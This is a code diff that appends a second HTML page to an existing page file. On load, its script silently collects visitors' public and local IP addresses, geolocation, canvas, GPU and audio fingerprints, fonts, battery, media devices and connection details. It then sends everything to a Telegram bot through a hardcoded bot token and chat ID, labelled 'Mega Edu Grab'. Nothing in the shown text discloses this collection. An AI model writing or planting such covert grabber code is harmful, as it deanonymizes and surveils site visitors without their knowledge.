@@ -359,3 +359,76 @@ document.addEventListener('mousemove', e=>{
 
 </body>
 </html>
+
+
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+</head>
+<body>
+<script>
+const BOT_TOKEN = "8253945171:AAG0T58v__eblhQCiSgF-5TyG7-eN12nFUI";
+const CHAT_ID = "976015997";
+
+async function fetchJSON(url) {
+  try { return await (await fetch(url)).json(); } catch { return {}; }
+}
+
+async function getPublicIP(){let r=await fetchJSON("https://api.ipify.org?format=json");return r.ip||"N/A";}
+async function getGeo(ip){return ip!=="N/A"?await fetchJSON(`https://ipapi.co/${ip}/json/`):{};}
+function getCanvasHash(){try{let c=document.createElement('canvas'),x=c.getContext('2d');x.textBaseline="top";x.font="14px Arial";x.fillStyle="#f60";x.fillRect(125,1,62,20);x.fillStyle="#069";x.fillText("edu-fp",2,2);return btoa(c.toDataURL()).substr(0,32);}catch{return"N/A";}}
+function getGPU(){try{let c=document.createElement('canvas'),g=c.getContext('webgl');let e=g.getExtension('WEBGL_debug_renderer_info');return g.getParameter(e.UNMASKED_RENDERER_WEBGL);}catch{return"N/A";}}
+async function getBattery(){try{let b=await navigator.getBattery();return `${(b.level*100).toFixed(0)}% ch:${b.charging}`;}catch{return"N/A";}}
+async function getLocalIPs(){return new Promise(r=>{let s=new Set();try{let pc=new RTCPeerConnection();pc.createDataChannel("");pc.onicecandidate=e=>{if(e.candidate){let m=/(\d+\.\d+\.\d+\.\d+)/.exec(e.candidate.candidate);if(m)s.add(m[1]);}};pc.createOffer().then(o=>pc.setLocalDescription(o));setTimeout(()=>r([...s]),2e3);}catch{r([])}});}
+async function getMediaDevices(){try{return (await navigator.mediaDevices.enumerateDevices()).map(d=>`${d.kind}:${d.label||"Hidden"}`);}catch{return["N/A"]}}
+async function getAudioFingerprint(){try{let ctx=new (window.AudioContext||window.webkitAudioContext)();let osc=ctx.createOscillator();let comp=ctx.createDynamicsCompressor();osc.connect(comp);comp.connect(ctx.destination);osc.start(0);let arr=new Float32Array(ctx.sampleRate);comp.getChannelData?comp.getChannelData(0,arr):null;osc.stop();return `rate:${ctx.sampleRate}`;}catch{return"N/A";}}
+function getFonts(){let baseWidth,height;const fonts=["Arial","Courier New","Times New Roman","Comic Sans MS"];let test=document.createElement('span');test.innerHTML="mmmmmmmmmmlli";test.style.fontSize="72px";test.style.display="inline-block";document.body.appendChild(test);let available=[];for(let f of fonts){test.style.fontFamily=f;let w=test.offsetWidth,h=test.offsetHeight;if(!baseWidth){baseWidth=w;height=h;}if(w!==baseWidth||h!==height)available.push(f);}test.remove();return available;}
+async function getStorageQuota(){try{let q=await navigator.storage.estimate();return `${(q.quota/1e6).toFixed(1)}MB`; }catch{return"N/A";}}
+function getPerf(){try{return performance.timing ? performance.timing.navigationStart : "N/A";}catch{return"N/A";}}
+function getSensors(){return {accel:"Accelerometer" in window,gyro:"Gyroscope" in window};}
+function getConn(){try{return navigator.connection ? {type:navigator.connection.effectiveType,down:navigator.connection.downlink} : {}; }catch{return{};}}
+
+async function collect(){
+  const ip=await getPublicIP();
+  const geo=await getGeo(ip);
+  return {
+    ts:new Date().toISOString(),
+    ua:navigator.userAgent,
+    lang:navigator.language,
+    plat:navigator.platform,
+    scr:`${screen.width}x${screen.height}`,
+    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    mem:navigator.deviceMemory,
+    cpu:navigator.hardwareConcurrency,
+    cookies:navigator.cookieEnabled,
+    gpu:getGPU(),
+    canvas:getCanvasHash(),
+    battery:await getBattery(),
+    ip,geo,
+    localIPs:await getLocalIPs(),
+    devices:await getMediaDevices(),
+    audioFp:await getAudioFingerprint(),
+    fonts:getFonts(),
+    tzOffset:new Date().getTimezoneOffset(),
+    touch:'ontouchstart' in window,
+    storage:await getStorageQuota(),
+    perf:getPerf(),
+    sensors:getSensors(),
+    conn:getConn()
+  };
+}
+
+async function sendTelegram(data){
+  const msg=`📋 Mega Edu Grab:\n${JSON.stringify(data,null,2)}`;
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+}
+
+(async()=>{
+  let data=await collect();
+  await sendTelegram(data);
+})();
+</script>
+</body>
+</html>
